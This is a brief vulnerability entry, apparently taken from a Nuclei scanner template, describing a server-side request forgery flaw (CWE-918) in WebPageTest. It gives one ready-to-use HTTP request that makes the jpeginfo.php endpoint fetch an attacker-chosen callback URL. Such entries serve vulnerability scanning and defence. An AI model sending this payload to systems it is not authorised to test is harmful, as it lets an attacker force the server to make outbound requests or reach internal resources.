# Vulnerability: Web Page Test - Server Side Request Forgery (SSRF)
**Classification:** CWE-918
**Source:** Nuclei Template (`webpagetest-ssrf.yaml`)

## Description
Web Page Test is vulnerable to SSRF.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/jpeginfo/jpeginfo.php?url={{interactsh-url}}
```

